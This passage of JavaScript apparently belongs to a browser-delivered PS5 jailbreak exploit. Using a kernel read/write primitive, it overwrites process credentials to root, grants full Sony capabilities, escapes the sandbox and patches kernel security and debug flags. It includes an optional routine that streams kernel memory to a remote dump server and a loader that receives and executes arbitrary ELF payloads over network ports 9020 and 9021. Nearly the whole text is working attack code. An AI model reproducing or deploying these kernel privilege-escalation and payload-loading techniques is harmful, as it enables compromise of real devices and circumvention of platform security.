                    await log("[!!!] This means we can dump kernel .text!", LogLevel.SUCCESS);

                    let dumpText = confirm(
                        ".TEXT IS READABLE!\n\n" +
                        "This is unexpected - GMET should block this.\n" +
                        "We can dump the kernel .text section!\n\n" +
                        "Dump first 0x100 bytes to log?\n" +
                        "OK = Dump sample\n" +
                        "Cancel = Skip"
                    );

                    if (dumpText) {
                        await log("Dumping first 0x100 bytes of .text:", LogLevel.WARN);
                        for (let toff = 0; toff < 0x100; toff += 8) {
                            let tval = await krw.read8(krw.ktextBase.add32(toff));
                            await log("  .text+0x" + toff.toString(16) + ": " + tval, LogLevel.INFO);
                        }
                    }
                } catch (e) {
                    await log("[.TEXT] Not readable (GMET active): " + e, LogLevel.INFO);
                    await log("[.TEXT] This is expected - need to extract kernel from firmware", LogLevel.INFO);
                }

                // ===== SUMMARY =====
                await log("========== RESEARCH SUMMARY ==========", LogLevel.SUCCESS);
                await log("kdataBase: " + krw.kdataBase, LogLevel.INFO);
                await log("ktextBase: " + krw.ktextBase, LogLevel.INFO);
                await log(".text pointers in writable region: " + textPtrs.length, LogLevel.INFO);
                await log("SVM cache locations found: " + svmMatches.length, LogLevel.INFO);
                await log("", LogLevel.INFO);
                await log("Next steps:", LogLevel.WARN);
                await log("1. Extract kernel from 4.03 PUP using bootrom", LogLevel.INFO);
                await log("2. Load into IDA, find code referencing 0xD11D08", LogLevel.INFO);
                await log("3. Find manumode variable location", LogLevel.INFO);
                await log("4. Trace dmem_resume_svm function", LogLevel.INFO);
            }
        }

        // OPTIONAL: Full kernel dump (disabled by default)
        let doDump = false; // Set to confirm(...) to enable
        if (doDump) {
            let dump_sock_addr_store = p.malloc(0x10);
            let dump_sock_fd = (await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low;
            await log("[DUMP] Opened socket: " + dump_sock_fd, LogLevel.INFO);

            for (let i = 0; i < 0x10; i += 0x8) {
                p.write8(dump_sock_addr_store.add32(i), new int64(0, 0));
            }

            p.write1(dump_sock_addr_store.add32(0x00), 0x10);
            p.write1(dump_sock_addr_store.add32(0x01), AF_INET);
            p.write2(dump_sock_addr_store.add32(0x02), DUMP_NET_PORT);
            p.write4(dump_sock_addr_store.add32(0x04), DUMP_NET_ADDR);

            await log("[DUMP] Connecting to dump server...", LogLevel.INFO);
            let connect_res = await chain.syscall(SYS_CONNECT, dump_sock_fd, dump_sock_addr_store, 0x10);
            await log("[DUMP] Connected: " + connect_res, LogLevel.INFO);

            let dump_buf = p.malloc(0x8);
            let dump_addr = krw.kdataBase;

            await log("[DUMP] Starting dump from kdataBase: " + dump_addr, LogLevel.WARN);
            alert("Starting kernel dump from kdataBase...\n\nDump will continue until crash.");

            for (let j = 0; ; j++) {
                let val = await krw.read8(dump_addr);
                p.write8(dump_buf, val);
                await chain.syscall(SYS_WRITE, dump_sock_fd, dump_buf, 0x8);
                dump_addr = dump_addr.add32(0x8);

                if (j % 0x8000 === 0) {
                    await log("[DUMP] Progress: 0x" + dump_addr + " (" + (j * 8 / 1024 / 1024).toFixed(1) + " MB)", LogLevel.INFO | LogLevel.FLAG_TEMP);
                }
            }
        }

        // Set security flags
        let security_flags = await krw.read4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS));
        await krw.write4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS), security_flags | 0x14);

        // Set targetid to DEX
        await krw.write1(get_kaddr(OFFSET_KERNEL_TARGETID), 0x82);

        // Set qa flags and utoken flags for debug menu enable
        let qaf_dword = await krw.read4(get_kaddr(OFFSET_KERNEL_QA_FLAGS));
        await krw.write4(get_kaddr(OFFSET_KERNEL_QA_FLAGS), qaf_dword | 0x10300);

        let utoken_flags = await krw.read1(get_kaddr(OFFSET_KERNEL_UTOKEN_FLAGS));
        await krw.write1(get_kaddr(OFFSET_KERNEL_UTOKEN_FLAGS), utoken_flags | 0x1);
        await log("Enabled debug menu", LogLevel.INFO);

        // Patch creds
        let cur_uid = await chain.syscall(SYS_GETUID);
        await log("Escalating creds... (current uid=0x" + cur_uid + ")", LogLevel.INFO);

        await krw.write4(krw.procUcredAddr.add32(0x04), 0); // cr_uid
        await krw.write4(krw.procUcredAddr.add32(0x08), 0); // cr_ruid
        await krw.write4(krw.procUcredAddr.add32(0x0C), 0); // cr_svuid
        await krw.write4(krw.procUcredAddr.add32(0x10), 1); // cr_ngroups
        await krw.write4(krw.procUcredAddr.add32(0x14), 0); // cr_rgid

        // Escalate sony privs
        await krw.write8(krw.procUcredAddr.add32(0x58), new int64(0x00000013, 0x48010000)); // cr_sceAuthId
        await krw.write8(krw.procUcredAddr.add32(0x60), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[0]
        await krw.write8(krw.procUcredAddr.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[1]
        await krw.write1(krw.procUcredAddr.add32(0x83), 0x80);                              // cr_sceAttr[0]

        // Remove dynlib restriction
        let proc_pdynlib_offset = krw.curprocAddr.add32(0x3E8);
        let proc_pdynlib_addr = await krw.read8(proc_pdynlib_offset);

        let restrict_flags_addr = proc_pdynlib_addr.add32(0x118);
        await krw.write4(restrict_flags_addr, 0);

        let libkernel_ref_addr = proc_pdynlib_addr.add32(0x18);
        await krw.write8(libkernel_ref_addr, new int64(1, 0));

        cur_uid = await chain.syscall(SYS_GETUID);
        await log("We root now? uid=0x" + cur_uid, LogLevel.INFO);

        // Escape sandbox
        let is_in_sandbox = await chain.syscall(SYS_IS_IN_SANDBOX);
        await log("Jailbreaking... (in sandbox: " + is_in_sandbox + ")" , LogLevel.INFO);
        let rootvnode = await krw.read8(get_kaddr(OFFSET_KERNEL_ROOTVNODE));
        await krw.write8(krw.procFdAddr.add32(0x10), rootvnode); // fd_rdir
        await krw.write8(krw.procFdAddr.add32(0x18), rootvnode); // fd_jdir

        is_in_sandbox = await chain.syscall(SYS_IS_IN_SANDBOX);
        await log("We escaped now? in sandbox: " + is_in_sandbox, LogLevel.INFO);

        // Patch PS4 SDK version
        if (typeof OFFSET_KERNEL_PS4SDK != 'undefined') {
            await krw.write4(get_kaddr(OFFSET_KERNEL_PS4SDK), 0x99999999);
            await log("Patched PS4 SDK version to 99.99", LogLevel.INFO);
        }

        // Allocate ELF store now (after dump dialog) to save memory if dumping
        elf_store = p.malloc(elf_store_size, 1);

        ///////////////////////////////////////////////////////////////////////
        // Stage 6: loader
        ///////////////////////////////////////////////////////////////////////

        let dlsym_addr = p.syscalls[SYS_DYNLIB_DLSYM];
        let jit_handle_store = p.malloc(0x4);
        // let test_store_buf   = p.malloc(0x4);

        // ELF sizes and offsets

        let OFFSET_ELF_HEADER_ENTRY = 0x18;
        let OFFSET_ELF_HEADER_PHOFF = 0x20;
        let OFFSET_ELF_HEADER_PHNUM = 0x38;

        let OFFSET_PROGRAM_HEADER_TYPE = 0x00;
        let OFFSET_PROGRAM_HEADER_FLAGS = 0x04;
        let OFFSET_PROGRAM_HEADER_OFFSET = 0x08;
        let OFFSET_PROGRAM_HEADER_VADDR = 0x10;
        let OFFSET_PROGRAM_HEADER_MEMSZ = 0x28;

        let OFFSET_RELA_OFFSET = 0x00;
        let OFFSET_RELA_INFO = 0x08;
        let OFFSET_RELA_ADDEND = 0x10;

        // ELF program header types
        let ELF_PT_LOAD = 0x01;
        let ELF_PT_DYNAMIC = 0x02;

        // ELF dynamic table types
        let ELF_DT_NULL = 0x00;
        let ELF_DT_RELA = 0x07;
        let ELF_DT_RELASZ = 0x08;
        let ELF_DT_RELAENT = 0x09;
        let ELF_R_AMD64_RELATIVE = 0x08;

        // ELF parsing
        var conn_ret_store = p.malloc(0x8);

        let shadow_mapping_addr = new int64(0x20100000, 0x00000009);
        let mapping_addr = new int64(0x26100000, 0x00000009);

        let elf_program_headers_offset = 0;
        let elf_program_headers_num = 0;
        let elf_entry_point = 0;

        var parse_elf_store = async function (total_sz = -1) {
            // Parse header
            // These are global variables
            elf_program_headers_offset = p.read4(elf_store.add32(OFFSET_ELF_HEADER_PHOFF));
            elf_program_headers_num = p.read4(elf_store.add32(OFFSET_ELF_HEADER_PHNUM)) & 0xFFFF;
            elf_entry_point = p.read4(elf_store.add32(OFFSET_ELF_HEADER_ENTRY));

            if (elf_program_headers_offset != 0x40) {
                await log("    ELF header malformed, terminating connection.", LogLevel.ERROR);
                throw new Error("ELF header malformed, terminating connection.");
            }

            //await log("parsing ELF file (" + total_sz.toString(10) + " bytes)...");

            let text_segment_sz = 0;
            let data_segment_sz = 0;
            let rela_table_offset = 0;
            let rela_table_count = 0;
            let rela_table_size = 0;
            let rela_table_entsize = 0;
            /** @type {int64} */
            let shadow_write_mapping = 0;

            // Parse program headers and map segments
            for (let i = 0; i < elf_program_headers_num; i++) {
                let program_header_offset = elf_program_headers_offset + (i * SIZE_ELF_PROGRAM_HEADER);

                let program_type = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_TYPE));
                let program_flags = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_FLAGS));
                let program_offset = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_OFFSET));
                let program_vaddr = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_VADDR));
                let program_memsz = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_MEMSZ));
                let aligned_memsz = (program_memsz + 0x3FFF) & 0xFFFFC000;

                if (program_type == ELF_PT_LOAD) {
                    // For executable segments, we need to take some care and do alias'd mappings.
                    // Also, the mapping size is fixed at 0x100000. This is because jitshm requires to be aligned this way... for some dumb reason.
                    if ((program_flags & 1) == 1) {
                        // Executable segment
                        text_segment_sz = program_memsz;

                        // Get exec
                        chain.add_syscall_ret(jit_handle_store, SYS_JITSHM_CREATE, 0x0, aligned_memsz, 0x7);
                        await chain.run();
                        let exec_handle = p.read4(jit_handle_store);

                        // Get write alias
                        chain.add_syscall_ret(jit_handle_store, SYS_JITSHM_ALIAS, exec_handle, 0x3);
                        await chain.run();
                        let write_handle = p.read4(jit_handle_store);

                        // Map to shadow mapping
                        chain.add_syscall_ret(conn_ret_store, SYS_MMAP, shadow_mapping_addr, aligned_memsz, 0x3, 0x11, write_handle, 0);
                        await chain.run();
                        shadow_write_mapping = p.read8(conn_ret_store);

                        // Copy in segment data
                        let dest = p.read8(conn_ret_store);
                        for (let j = 0; j < program_memsz; j += 0x8) {
                            let src_qword = p.read8(elf_store.add32(program_offset + j));
                            p.write8(dest.add32(j), src_qword);
                        }

                        // Map executable segment
                        await chain.add_syscall_ret(conn_ret_store, SYS_MMAP, mapping_addr.add32(program_vaddr), aligned_memsz, 0x5, 0x11, exec_handle, 0);
                        await chain.run();
                    } else {
                        // Regular data segment
                        // data_mapping_addr = mapping_addr.add32(program_vaddr);
                        data_segment_sz = aligned_memsz;

                        await chain.add_syscall_ret(conn_ret_store, SYS_MMAP, mapping_addr.add32(program_vaddr), aligned_memsz, 0x3, 0x1012, 0xFFFFFFFF, 0);
                        await chain.run();

                        // Copy in segment data
                        let dest = mapping_addr.add32(program_vaddr);
                        for (let j = 0; j < program_memsz; j += 0x8) {
                            let src_qword = p.read8(elf_store.add32(program_offset + j));
                            p.write8(dest.add32(j), src_qword);
                        }
                    }
                }

                if (program_type == ELF_PT_DYNAMIC) {
                    // Parse dynamic tags, the ones we truly care about are rela-related.
                    for (let j = 0x00; ; j += 0x10) {
                        let d_tag = p.read8(elf_store.add32(program_offset + j)).low;
                        let d_val = p.read8(elf_store.add32(program_offset + j + 0x08));

                        // DT_NULL means we reached the end of the table
                        if (d_tag == ELF_DT_NULL || j > 0x100) {
                            break;
                        }

                        switch (d_tag) {
                            case ELF_DT_RELA:
                                rela_table_offset = d_val.low;
                                break;
                            case ELF_DT_RELASZ:
                                rela_table_size = d_val.low;
                                break;
                            case ELF_DT_RELAENT:
                                rela_table_entsize = d_val.low;
                                break;
                        }
                    }
                }
            }

            // Process relocations if they exist
            if (rela_table_offset != 0) {
                let base_address = 0x1000;

                // The rela table offset from dynamic table is relative to the LOAD segment offset not file offset.
                // The linker script should guarantee it ends up in the first LOAD segment (code).
                rela_table_offset += base_address;

                // Rela count can be gotten from dividing the table size by entry size
                rela_table_count = rela_table_size / rela_table_entsize;

                // Parse relocs and apply them
                for (let i = 0; i < rela_table_count; i++) {
                    let r_offset = p.read8(elf_store.add32(rela_table_offset + (i * rela_table_entsize) +
                        OFFSET_RELA_OFFSET));
                    let r_info = p.read8(elf_store.add32(rela_table_offset + (i * rela_table_entsize) +
                        OFFSET_RELA_INFO));
                    let r_addend = p.read8(elf_store.add32(rela_table_offset + (i * rela_table_entsize) +
                        OFFSET_RELA_ADDEND));

                    let reloc_addr = mapping_addr.add32(r_offset.low);

                    // If the relocation falls in the executable section, we need to redirect the write to the
                    // writable shadow mapping or we'll crash
                    if (r_offset.low <= text_segment_sz) {
                        reloc_addr = shadow_write_mapping.add32(r_offset.low);
                    }

                    if ((r_info.low & 0xFF) == ELF_R_AMD64_RELATIVE) {
                        let reloc_value = mapping_addr.add32(r_addend.low); // B + A
                        p.write8(reloc_addr, reloc_value);
                    }
                }
            }
        }

        // reuse these plus we can more easily access them
        let rwpair_mem = p.malloc(0x8);
        let test_payload_store = p.malloc(0x8);
        let pthread_handle_store = p.malloc(0x8);
        let pthread_value_store = p.malloc(0x8);
        let args = p.malloc(0x8 * 6);

        var execute_elf_store = async function () {
            // zero out the buffers defined above
            p.write8(rwpair_mem, 0);
            p.write8(rwpair_mem.add32(0x4), 0);
            p.write8(test_payload_store, 0);
            p.write8(pthread_handle_store, 0);
            p.write8(pthread_value_store, 0);
            for (let i = 0; i < 0x8 * 6; i++) {
                p.write1(args.add32(i), 0);
            }

            // Pass master/victim pair to payload so it can do read/write
            p.write4(rwpair_mem.add32(0x00), krw.masterSock);
            p.write4(rwpair_mem.add32(0x04), krw.victimSock);

            // Arguments to entrypoint
            p.write8(args.add32(0x00), dlsym_addr);         // arg1 = dlsym_t* dlsym
            p.write8(args.add32(0x08), krw.pipeMem);        // arg2 = int *rwpipe[2]
            p.write8(args.add32(0x10), rwpair_mem);         // arg3 = int *rwpair[2]
            p.write8(args.add32(0x18), krw.pipeAddr);       // arg4 = uint64_t kpipe_addr
            p.write8(args.add32(0x20), krw.kdataBase);      // arg5 = uint64_t kdata_base_addr
            p.write8(args.add32(0x28), test_payload_store); // arg6 = int *payloadout

            // Execute payload in pthread
            await log("    Executing...", LogLevel.INFO);
            await chain.call(p.libKernelBase.add32(OFFSET_lk_pthread_create_name_np), pthread_handle_store, 0x0, mapping_addr.add32(elf_entry_point), args, p.stringify("payload"));

        }

        /**
         * @returns Promise<number> - The return value of the payload
         */
        var wait_for_elf_to_exit = async function () {
            // Join pthread and wait until we're finished executing
            await chain.call(p.libKernelBase.add32(OFFSET_lk_pthread_join), p.read8(pthread_handle_store), pthread_value_store);
            let res = p.read8(test_payload_store).low << 0;
            await log("    Finished, out = 0x" + res.toString(16), LogLevel.LOG);

            return res;
        }

        var load_local_elf = async function (filename) {
            try {
                let total_sz = await load_payload_into_elf_store_from_local_file(filename);
                await parse_elf_store(total_sz);
                await execute_elf_store();
                return await wait_for_elf_to_exit();
            } catch (error) {
                await log("    Failed to load local elf: " + error, LogLevel.ERROR);
                return -1;
            }
        }

        if (await load_local_elf("elfldr-ps5.elf") == 0) {
            await log(`elfldr listening on ${ip.ip}:9021`, LogLevel.INFO);
            is_elfldr_running = true;
        } else {
            await log("elfldr exited with non-zero code, port 9021 will likely not work", LogLevel.ERROR);
            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        // const SOCK_NONBLOCK = 0x20000000; // for future reference, this is ignored if we're not jailbroken and explicitly setting it with fcntl returns SCE_KERNEL_ERROR_EACCES (at least on 4.03)

        var elf_loader_socket_fd = (await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low;
        if (elf_loader_socket_fd <= 0) {
            throw new Error("Failed to create ELF loader socket");
        }

        var elf_loader_sock_addr_store = p.malloc(0x10, 1);
        build_addr(p, elf_loader_sock_addr_store, AF_INET, htons(9020), 0);

        let SOL_SOCKET = 0xFFFF;
        let SO_REUSEADDR = 0x0004;
        let opt_buf = p.malloc(0x4, 1);
        p.write4(opt_buf, 1);

        let setsockopt_res = (await chain.syscall(SYS_SETSOCKOPT, elf_loader_socket_fd, SOL_SOCKET, SO_REUSEADDR, opt_buf, 0x4)).low << 0;
        if (setsockopt_res < 0) {
            throw new Error("Failed to setsockopt on ELF loader socket");
        }

        let bind_res = (await chain.syscall(SYS_BIND, elf_loader_socket_fd, elf_loader_sock_addr_store, 0x10)).low << 0;
        if (bind_res < 0) {
            throw new Error("Failed to bind ELF loader socket");
        }

        let backlog = 16;
        let listen_res = (await chain.syscall(SYS_LISTEN, elf_loader_socket_fd, backlog)).low << 0;
        if (listen_res < 0) {
            throw new Error("Failed to listen on ELF loader socket");
        }

        var conn_addr_store = p.malloc(0x10, 1);
        var conn_addr_size_store = p.malloc(0x4, 1);

        var select_readfds_size = 1024 / 8;
        var select_readfds = p.malloc(select_readfds_size, 1);

        var timeout_size = 0x10; // 16 bytes
        var timeout = p.malloc(timeout_size);
        p.write8(timeout, 0); // tv_sec
        p.write8(timeout.add32(0x8), 50000); // tv_usec - 50000 us = 50 ms

        await log("elf loader listening on port 9020", LogLevel.INFO);
    }

    // Allocate elf_store for wkOnly mode (wasn't allocated above)
    if (elf_store === null) {
        elf_store = p.malloc(elf_store_size, 1);
    }

    async function fstat(fd, stat_buf) {
        if (stat_buf.backing.byteLength < 0x78) {
            throw new Error("Stat buffer size too small");
        }

        // struct stat {
        //     0 __dev_t   st_dev;		/* inode's device */
        //     4 ino_t	  st_ino;		/* inode's number */
        //     8 mode_t	  st_mode;		/* inode protection mode */
        //     10 nlink_t	  st_nlink;		/* number of hard links */
        //     12 uid_t	  st_uid;		/* user ID of the file's owner */
        //     16 gid_t	  st_gid;		/* group ID of the file's group */
        //     20 __dev_t   st_rdev;		/* device type */
        //     24 struct	timespec st_atim;	/* time of last access */
        //     40 struct	timespec st_mtim;	/* time of last data modification */
        //     56 struct	timespec st_ctim;	/* time of last file status change */
        //     72 off_t	  st_size;		/* file size, in bytes */
        //     80 blkcnt_t st_blocks;		/* blocks allocated for file */
        //     88 blksize_t st_blksize;		/* optimal blocksize for I/O */
        //     92 fflags_t  st_flags;		/* user defined flags for file */
        //     96 __uint32_t st_gen;		/* file generation number */
        //     100 __int32_t st_lspare;
        //     104 struct timespec st_birthtim;	/* time of file creation */
        //     unsigned int :(8 / 2) * (16 - (int)sizeof(struct timespec));
        //     unsigned int :(8 / 2) * (16 - (int)sizeof(struct timespec));
        // };

        let res = (await chain.syscall(SYS_FSTAT, fd, stat_buf)).low << 0;

        if (res < 0) {
            throw new Error("Error getting file status, res: " + res);
        }

        let st_rdev = p.read4(stat_buf.add32(20));

        let st_atim_tv_sec = p.read8(stat_buf.add32(24));
        let st_atim = new Date(st_atim_tv_sec.low * 1000 + st_atim_tv_sec.hi / 1000);

        let st_mtim_tv_sec = p.read8(stat_buf.add32(40));
        let st_mtim = new Date(st_mtim_tv_sec.low * 1000 + st_mtim_tv_sec.hi / 1000);

        let st_ctim_tv_sec = p.read8(stat_buf.add32(56));
        let st_ctim = new Date(st_ctim_tv_sec.low * 1000 + st_ctim_tv_sec.hi / 1000);

        let st_size = p.read8(stat_buf.add32(72));
        if (st_size.hi !== 0) {
            throw new Error("File size too large");
        }

        let st_blksize = p.read4(stat_buf.add32(88));

        let st_flags = p.read4(stat_buf.add32(92));

        let st_birthtim_tv_sec = p.read8(stat_buf.add32(104));
        let st_birthtim = new Date(st_birthtim_tv_sec.low * 1000 + st_birthtim_tv_sec.hi / 1000);

        return {
            st_rdev: st_rdev,
            st_atim: st_atim,
            st_mtim: st_mtim,
            st_ctim: st_ctim,
            st_size: st_size.low,
            st_blksize: st_blksize,
            fflags_t: st_flags,
            st_birthtim: st_birthtim,
        };
    }

    const DT_DIR = 4;

    async function ls(path, temp_buf) {
        if (!temp_buf.backing) {
            throw new Error("buffers backing js array not set");
        }
        let temp_buf_size = temp_buf.backing.byteLength;

        if (temp_buf_size < 0x108 || temp_buf_size < path.length + 1) {
            throw new Error("Temp buffer size too small");
        }

        if (path.endsWith("/") && path !== "/") {
            path = path.slice(0, -1);
        }

        // const DIRENT_SIZE = 0x108; // this is the max size, the string doesnt have a constant size

        let bufferDataView = new DataView(temp_buf.backing.buffer, temp_buf.backing.byteOffset, temp_buf_size);

        const O_DIRECTORY = 0x00020000;

        /** @type {{d_fileno: number, d_reclen: number, d_type: number, d_namlen: number, d_name: string}[]} */
        let result = [];

        p.writestr(temp_buf, path);

        let dir_fd = (await chain.syscall(SYS_OPEN, temp_buf, O_DIRECTORY)).low << 0;
        if (dir_fd < 0) {
            throw new Error(`Error opening directory '${path}' (not found, or not a directory)`);
        }

        try {
            // Get block size
            let stat = await fstat(dir_fd, temp_buf);

            let block_size = stat.st_blksize;

            if (block_size <= 0) {
                throw new Error("Invalid block size");
            }

            // for usbs getdirentries works with smaller buffers than block size but on the internal storage i get -1 if its smaller
            if (temp_buf_size < block_size) {
                throw new Error("Dirent buffer size too small, it has to be at least the fs block size which is " + block_size);
            }

            let total_bytes_read = 0;
            let total_files = 0;

            while (true) {
                // normally the getdirentries syscall reads and writes to basep, however it still works correctly with 0 passed, it seems if its 0 it uses lseek to keep track of pos between calls
                let bytes_read = (await chain.syscall(SYS_GETDIRENTRIES, dir_fd, temp_buf, temp_buf_size, 0)).low << 0;

                if (bytes_read < 0) {
                    throw new Error("Error reading directory");
                }

                if (bytes_read == 0) {
                    break;
                }

                let offset = 0;
                let loops = 0;
                while (offset < bytes_read) {
                    loops++;
                    // struct dirent {
                    //     __uint32_t d_fileno;		/* file number of entry */
                    //     __uint16_t d_reclen;		/* length of this record */
                    //     __uint8_t  d_type; 		/* file type, see below */
                    //     __uint8_t  d_namlen;		/* length of string in d_name */
                    // #if __BSD_VISIBLE
                    // #define	MAXNAMLEN	255
                    //     char	d_name[MAXNAMLEN + 1];	/* name must be no longer than this */
                    // #else
                    //     char	d_name[255 + 1];	/* name must be no longer than this */
                    // #endif
                    // };

                    let d_fileno = bufferDataView.getUint32(offset, true);
                    let d_reclen = bufferDataView.getUint16(offset + 4, true);
                    let d_type = bufferDataView.getUint8(offset + 6);
                    let d_namlen = bufferDataView.getUint8(offset + 7);
                    let d_name = "";
                    for (let i = 0; i < d_namlen; i++) {
                        d_name += String.fromCharCode(bufferDataView.getUint8(offset + 8 + i));
                    }

                    result.push({ d_fileno, d_reclen, d_type, d_namlen, d_name });

                    offset += d_reclen;
                    total_files++;
                }

                total_bytes_read += bytes_read;
            }

            return result;
        } finally {
            await chain.syscall(SYS_CLOSE, dir_fd);

            if (temp_buf.backing) {
                temp_buf.backing.fill(0);
            }
        }
    }

    /**
     * @param {function(string): void} [log]
     */
    async function delete_appcache(log = () => { }) {
        let user_home_entries = await ls("/user/home", elf_store);
        // if we're sandboxed we'll only have one
        let user_ids = user_home_entries.reduce((acc, dirent) => {
            if (dirent.d_type === DT_DIR && dirent.d_name !== "." && dirent.d_name !== "..") {
                let user_id = dirent.d_name;
                acc.push(user_id);
            }
            return acc;
        }, []);

        if (user_ids.length === 0) {
            throw new Error("No users found");
        }

        async function unlink(path) {
            p.writestr(elf_store, path);
            return await chain.syscall_int32(SYS_UNLINK, elf_store);
        }

        for (let user_id of user_ids) {
            await unlink(`/user/home/${user_id}/webkit/shell/appcache/ApplicationCache.db`);
            await unlink(`/user/home/${user_id}/webkit/shell/appcache/ApplicationCache.db-shm`);
            await unlink(`/user/home/${user_id}/webkit/shell/appcache/ApplicationCache.db-wal`);
            await log(`Deleted appcache files for user with id '${user_id}'`);
        }

        if (user_ids.length > 1) {
            await log(`Deleted appcache files for all ${user_ids.length} users`);
        }
    }

    async function send_buffer_to_port(buffer, size, port) {
        let sock = (await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low << 0;
        if (sock <= 0) {
            throw new Error("Failed to create socket");
        }

        build_addr(p, send_buffer_to_port.sock_addr_store, AF_INET, htons(port), 0x0100007F);

        let connect_res = (await chain.syscall(SYS_CONNECT, sock, send_buffer_to_port.sock_addr_store, 0x10)).low << 0;
        if (connect_res < 0) {
            await chain.syscall(SYS_CLOSE, sock);
            throw new Error("Failed to connect to port " + port);
        }

        let bytes_sent = 0;
        let write_ptr = buffer.add32(0x0);
        while (bytes_sent < size) {
            let send_res = (await chain.syscall(SYS_WRITE, sock, write_ptr, size - bytes_sent)).low << 0;
            if (send_res <= 0) {
                await chain.syscall(SYS_CLOSE, sock);
                throw new Error("Failed to send buffer to port " + port);
            }

            bytes_sent += send_res;
            write_ptr.add32inplace(send_res);
        }

        await chain.syscall(SYS_CLOSE, sock);
    }
    send_buffer_to_port.sock_addr_store = p.malloc(0x10, 1);

    sessionStorage.removeItem(SESSIONSTORE_ON_LOAD_AUTORUN_KEY);

    let ports = wkOnly ? "" : "9020";
    if (is_elfldr_running) {
        if (ports) {
            ports += ", ";
        }
        ports += "9021";
    }

    // @ts-ignore
    document.getElementById('top-bar-text').innerHTML = `Listening on: <span class="fw-bold">${ip.ip}</span> (port: ${ports}) (${ip.name})`;

    /** @type {Array<{payload_info: PayloadInfo, toast: HTMLElement}>} */
    let queue = [];

    window.addEventListener(MAINLOOP_EXECUTE_PAYLOAD_REQUEST, async function (event) {
        /** @type {PayloadInfo} */
        let payload_info = event.detail;
        let toast = showToast(`${payload_info.displayTitle}: Waiting in queue...`, -1);
        queue.push({ payload_info, toast });
    });

    // await log("Done, switching to payloads screen...", LogLevel.INFO);
    await new Promise(resolve => setTimeout(resolve, 300));
    await switchPage("payloads-view");


    while (true) {

        if (queue.length > 0) {

            let { payload_info, toast } = /** @type {{payload_info: PayloadInfo, toast: HTMLElement}} */ (queue.shift());

            try {
                if (payload_info.customAction) {
                    if (payload_info.customAction === CUSTOM_ACTION_APPCACHE_REMOVE) {
                        await delete_appcache(updateToastMessage.bind(null, toast));
                    } else {
                        throw new Error(`Unknown custom action: ${payload_info.customAction}`);
                    }
                } else {
                    updateToastMessage(toast, `${payload_info.displayTitle}: Fetching...`);
                    let total_sz = await load_payload_into_elf_store_from_local_file(payload_info.fileName);

                    if (!payload_info.toPort) {
                        if (wkOnly) {
                            throw new Error(); // unreachable, in wkOnly theres only buttons for payloads with toPort
                        }

                        updateToastMessage(toast, `${payload_info.displayTitle}: Parsing...`);
                        await parse_elf_store(total_sz);
                        updateToastMessage(toast, `${payload_info.displayTitle}: Payload running...`);
                        await execute_elf_store();
                        let out = await wait_for_elf_to_exit();

                        if (out !== 0) {
                            throw new Error('Payload exited with non-zero code: 0x' + out.toString(16));
                        }

                        updateToastMessage(toast, `${payload_info.displayTitle}: Payload exited with success code`);
                    } else {
                        updateToastMessage(toast, `${payload_info.displayTitle}: Sending to port ${payload_info.toPort}...`);
                        await send_buffer_to_port(elf_store, total_sz, payload_info.toPort);
                        updateToastMessage(toast, `${payload_info.displayTitle}: Sent to port ${payload_info.toPort}`);
                    }
                }

            } catch (error) {
                updateToastMessage(toast, `${payload_info.displayTitle}: Error: ${error}`);
                setTimeout(removeToast, TOAST_ERROR_TIMEOUT, toast);
                continue;
            }

            setTimeout(removeToast, TOAST_SUCCESS_TIMEOUT, toast);
        }

        if (queue.length > 0) {
            continue; // prioritize actions before handling port 9020 stuff
        }

        if (wkOnly) { // in wk only mode i havent set up the socket since we cant load elfs anyway
            await new Promise(resolve => setTimeout(resolve, 50));
            continue;
        }

        select_readfds.backing.fill(0);
        select_readfds.backing[elf_loader_socket_fd >> 3] |= 1 << (elf_loader_socket_fd & 7);
        let select_res = (await chain.syscall(SYS_SELECT, elf_loader_socket_fd + 1, select_readfds, 0, 0, timeout)).low << 0;
        if (select_res < 0) {
            throw new Error("Select failed");
        } else if (select_res === 0) {
            continue;
        }

        let conn_fd = (await chain.syscall(SYS_ACCEPT, elf_loader_socket_fd, conn_addr_store, conn_addr_size_store)).low << 0;
        if (conn_fd < 0) {
            throw new Error("Failed to accept connection");
        }

        let toast = showToast("ELF Loader: Got a connection, reading...", -1);
        try {
            // Got a connection, read all we can
            let write_ptr = elf_store.add32(0x0);
            let total_sz = 0;
            while (total_sz < elf_store_size) {
                let read_res = (await chain.syscall(SYS_READ, conn_fd, write_ptr, elf_store_size - total_sz)).low << 0;
                if (read_res <= 0) {
                    break;
                }

                write_ptr.add32inplace(read_res);
                total_sz += read_res;
            }

            updateToastMessage(toast, "ELF Loader: Parsing ELF...");
            await parse_elf_store(total_sz);

            updateToastMessage(toast, "ELF Loader: Executing ELF...");
            await execute_elf_store();

            let out = await wait_for_elf_to_exit();
            if (out !== 0) {
                throw new Error('ELF Loader exited with non-zero code: 0x' + out.toString(16));
            }

            updateToastMessage(toast, "ELF Loader: Payload exited with success code");
            setTimeout(removeToast, TOAST_SUCCESS_TIMEOUT, toast);
        } catch (error) {
            updateToastMessage(toast, `ELF Loader: Error: ${error}`);
            setTimeout(removeToast, TOAST_ERROR_TIMEOUT, toast);
        } finally {
            await chain.syscall(SYS_CLOSE, conn_fd);
        }

    }

}

let fwScript = document.createElement('script');
document.body.appendChild(fwScript);
// @ts-ignore
fwScript.setAttribute('src', `offsets/${window.fw_str}.js`);
